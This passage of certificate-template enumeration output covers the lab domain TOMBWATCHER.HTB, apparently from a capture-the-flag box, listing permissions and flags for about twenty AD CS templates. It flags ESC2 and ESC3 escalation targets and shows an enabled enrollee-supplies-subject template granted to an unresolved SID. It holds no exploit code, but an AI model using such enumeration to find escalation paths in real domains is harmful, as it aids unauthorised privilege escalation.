    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireCommonName
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\RAS and IAS Servers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\RAS and IAS Servers
  3
    Template Name                       : Workstation
    Display Name                        : Workstation Authentication
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Enterprise Admins
  4
    Template Name                       : DirectoryEmailReplication
    Display Name                        : Directory Email Replication
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDirectoryGuid
                                          SubjectAltRequireDns
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Directory Service Email Replication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
  5
    Template Name                       : DomainControllerAuthentication
    Display Name                        : Domain Controller Authentication
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
                                          Smart Card Logon
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
  6
    Template Name                       : KeyRecoveryAgent
    Display Name                        : Key Recovery Agent
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PendAllRequests
                                          PublishToKraContainer
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Key Recovery Agent
    Requires Manager Approval           : True
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  7
    Template Name                       : CAExchange
    Display Name                        : CA Exchange
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
    Extended Key Usage                  : Private Key Archival
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 week
    Renewal Period                      : 1 day
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  8
    Template Name                       : CrossCA
    Display Name                        : Cross Certification Authority
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    RA Application Policies             : Qualified Subordination
    Authorized Signatures Required      : 1
    Schema Version                      : 2
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  9
    Template Name                       : ExchangeUserSignature
    Display Name                        : Exchange Signature Only
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Secure Email
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  10
    Template Name                       : ExchangeUser
    Display Name                        : Exchange User
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Secure Email
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  11
    Template Name                       : CEPEncryption
    Display Name                        : CEP Encryption
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  12
    Template Name                       : OfflineRouter
    Display Name                        : Router (Offline request)
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  13
    Template Name                       : IPSECIntermediateOffline
    Display Name                        : IPSec (Offline request)
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : IP security IKE intermediate
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  14
    Template Name                       : IPSECIntermediateOnline
    Display Name                        : IPSec
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : IP security IKE intermediate
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
  15
    Template Name                       : SubCA
    Display Name                        : Subordinate Certification Authority
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  16
    Template Name                       : CA
    Display Name                        : Root Certification Authority
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  17
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
  18
    Template Name                       : DomainController
    Display Name                        : Domain Controller
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDirectoryGuid
                                          SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
  19
    Template Name                       : Machine
    Display Name                        : Computer
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Computers
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
  20
    Template Name                       : MachineEnrollmentAgent
    Display Name                        : Enrollment Agent (Computer)
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  21
    Template Name                       : EnrollmentAgentOffline
    Display Name                        : Exchange Enrollment Agent (Offline request)
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  22
    Template Name                       : EnrollmentAgent
    Display Name                        : Enrollment Agent
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
